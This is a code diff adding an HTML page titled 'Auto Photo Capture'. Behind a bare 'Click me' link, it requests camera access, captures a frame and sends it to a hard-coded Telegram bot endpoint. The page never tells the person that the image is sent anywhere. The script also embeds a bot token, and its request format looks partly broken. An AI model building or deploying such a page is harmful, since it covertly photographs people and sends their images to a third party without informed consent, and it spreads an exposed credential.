@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Photo Capture</title>
+</head>
+<body>
+  <a href="#" id="capture-link">Click me</a>
+
+  <script>
+    // Get the capture link element
+    const captureLink = document.getElementById('capture-link');
+
+    // Add click event listener to the link
+    captureLink.addEventListener('click', function(event) {
+      event.preventDefault();
+
+      // Request access to the user's camera
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function(stream) {
+          // Create a video element to display the camera stream
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          video.play();
+
+          // Wait for the video to load metadata
+          video.addEventListener('loadedmetadata', function() {
+            // Create a canvas element to capture the photo
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current frame from the video onto the canvas
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert the canvas image to base64 data URL
+            const imageDataUrl = canvas.toDataURL('image/png');
+
+            // Send the photo to Telegram bot using fetch API
+            fetch('https://api.telegram.org/bot8603317282:AAHG3gXtWVh9MjaAN71AToWR51MzHiWRAto/sendPhoto', {
+              method: 'POST',
+              body: JSON.stringify({
+                chat_id: '<8603317282',
+                photo: imageDataUrl,
+                caption: 'Photo captured automatically!'
+              }),
+              headers: {
+                'Content-Type': 'application/json'
+              }
+            })
+              .then(function(response) {
+                if (response.ok) {
+                  alert('Photo sent successfully!');
+                } else {
+                  alert('Failed to send photo.');
+                }
+              })
+              .catch(function(error) {
+                alert('Error sending photo:', error);
+              });
+
+            // Stop the camera stream after capturing the photo
+            stream.getTracks().forEach(function(track) {
+              track.stop();
+            });
+          });
+        })
+        .catch(function(error) {
+          alert('Error accessing camera:', error);
+        });
+    });
+  </script>
+</body>
+</html>
